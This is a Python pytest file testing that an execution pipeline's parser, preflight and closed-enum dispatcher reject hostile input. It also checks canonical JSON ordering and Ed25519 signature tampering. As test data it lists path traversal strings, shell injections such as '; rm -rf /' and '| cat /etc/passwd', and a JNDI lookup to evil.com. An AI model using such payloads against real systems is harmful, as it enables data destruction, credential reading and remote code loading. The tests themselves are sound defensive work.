"""T033: production parser/preflight/closed-dispatch boundary tests."""

from __future__ import annotations

import copy
import json
import random
from dataclasses import replace
from unittest.mock import MagicMock

import pytest
from deltacontroller.canonical import canonicalize_jcs, compute_intent_digest
from deltacontroller.errors import JcsCanonicalizationError, SchemaValidationError
from deltacontroller.ingress import IngressParser
from deltatorrent.live_execution.crypto import (
    jcs_dumps,
    verify_admission_signature,
    verify_ed25519,
)
from deltatorrent.live_execution.dispatch import ClosedEnumWorkerDispatcher
from deltatorrent.live_execution.errors import WorkerDispatchError
from deltatorrent.live_execution.preflight import AuthorizedExecutionPreflight
from security_support import (
    CURRENT_TIME,
    admit_train_ticket,
    build_gate_harness,
    load_valid_fixture,
)


@pytest.fixture
def train_intent() -> dict:
    return load_valid_fixture("execution-intent.train-ticket.json")


def test_t033_production_ingress_rejects_path_traversal_strings(
    train_intent: dict,
) -> None:
    parser = IngressParser()
    hostile_values = [
        "../etc/passwd",
        "..\\windows\\system32\\cmd.exe",
        "/absolute/path/escape",
        "C:\\Windows\\system.ini",
        "file:///etc/shadow",
        "dataset\0null_byte",
    ]

    for attack in hostile_values:
        intent = copy.deepcopy(train_intent)
        intent["operation_payload"]["ticket_id"] = attack
        with pytest.raises(SchemaValidationError) as exc_info:
            parser.parse_intent(intent, current_time=CURRENT_TIME)
        assert exc_info.value.code == "ERR_SCHEMA_VALIDATION_FAILED"


def test_t033_production_ingress_rejects_command_injection_strings(
    train_intent: dict,
) -> None:
    parser = IngressParser()
    hostile_values = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "__import__('os').system('id')",
        "eval('1+1')",
        "${jndi:ldap://evil.com/x}",
    ]

    for attack in hostile_values:
        intent = copy.deepcopy(train_intent)
        intent["operation_payload"]["partition_id"] = attack
        with pytest.raises(SchemaValidationError) as exc_info:
            parser.parse_intent(intent, current_time=CURRENT_TIME)
        assert exc_info.value.code == "ERR_SCHEMA_VALIDATION_FAILED"


def test_t033_unknown_operation_fails_schema_before_dispatch(
    train_intent: dict,
) -> None:
    intent = copy.deepcopy(train_intent)
    intent["operation"] = "RUN_ARBITRARY_PYTHON"
    intent["intent_digest"] = compute_intent_digest(intent)

    with pytest.raises(SchemaValidationError) as exc_info:
        IngressParser().parse_intent(intent, current_time=CURRENT_TIME)

    assert exc_info.value.code == "ERR_SCHEMA_VALIDATION_FAILED"


def test_t033_closed_enum_dispatch_rejects_arbitrary_operations(
    train_intent: dict,
) -> None:
    harness = build_gate_harness()
    bundle = admit_train_ticket(harness, train_intent)["bundle"]
    preflight = AuthorizedExecutionPreflight(
        trusted_keys={bundle["admission"]["authenticator"]["key_id"]: harness.public_key_hex}
    )
    ctx = preflight.validate(bundle, current_time=CURRENT_TIME)
    mock_runner = MagicMock()

    for op in (
        "EXECUTE_SHELL",
        "TRAIN_STAGE_C",
        "RUN_ARBITRARY_PYTHON",
        "STAGE_C_REAL_DRQ1",
        "APPLY_QC",
        "",
    ):
        with pytest.raises(WorkerDispatchError) as exc_info:
            ClosedEnumWorkerDispatcher().dispatch(
                replace(ctx, operation=op),
                runner_override=mock_runner,
            )
        assert exc_info.value.code == "ERR_OPERATION_SCOPE_UNSUPPORTED"

    mock_runner.train_ticket.assert_not_called()
    mock_runner.emit_execution_receipt.assert_not_called()


def test_t033_materialize_cache_key_path_escape_fails_before_runner_call(
    train_intent: dict,
) -> None:
    harness = build_gate_harness()
    bundle = admit_train_ticket(harness, train_intent)["bundle"]
    preflight = AuthorizedExecutionPreflight(
        trusted_keys={bundle["admission"]["authenticator"]["key_id"]: harness.public_key_hex}
    )
    ctx = preflight.validate(bundle, current_time=CURRENT_TIME)
    mock_runner = MagicMock()

    for cache_key in ("../../escape", "/tmp/escape", "C:\\Windows\\system.ini"):
        with pytest.raises(WorkerDispatchError) as exc_info:
            ClosedEnumWorkerDispatcher().dispatch(
                replace(
                    ctx,
                    operation="MATERIALIZE_DATASET",
                    operation_payload={"cache_key": cache_key},
                ),
                runner_override=mock_runner,
            )
        assert exc_info.value.code == "ERR_SCHEMA_VALIDATION_FAILED"

    mock_runner.materialize_dataset.assert_not_called()


def test_t033_jcs_key_sorting_property_uses_production_worker_canonicalizer() -> None:
    keys = ["a", "z", "A", "Z", "0", "9", "_", "-", "é", "ñ", "Ω", "😀"]
    random.seed(42)

    for _ in range(20):
        sample_keys = random.sample(keys, len(keys))
        document = {key: f"val_{key}" for key in sample_keys}
        canonical_str = jcs_dumps(document)
        parsed_pairs = json.loads(canonical_str, object_pairs_hook=list)
        actual_order = [key for key, _ in parsed_pairs]
        expected_order = sorted(sample_keys, key=lambda item: item.encode("utf-16-be"))
        assert actual_order == expected_order


def test_t033_ed25519_tamper_fuzz_uses_production_worker_verifier(
    train_intent: dict,
) -> None:
    harness = build_gate_harness()
    admission = admit_train_ticket(harness, train_intent)["admission"]
    assert verify_admission_signature(admission, harness.public_key_hex) is True

    random.seed(1337)
    pub_bytes = bytes.fromhex(harness.public_key_hex)
    msg = b'{"test":"message"}'
    for _ in range(30):
        fuzz_sig = bytes(random.getrandbits(8) for _ in range(64))
        assert verify_ed25519(pub_bytes, msg, fuzz_sig) is False


def test_t033_malformed_numbers_fail_closed_in_production_canonicalizer() -> None:
    for payload in (
        {"nan": float("nan")},
        {"inf": float("inf")},
        {"neg_inf": float("-inf")},
    ):
        with pytest.raises(JcsCanonicalizationError):
            canonicalize_jcs(payload)
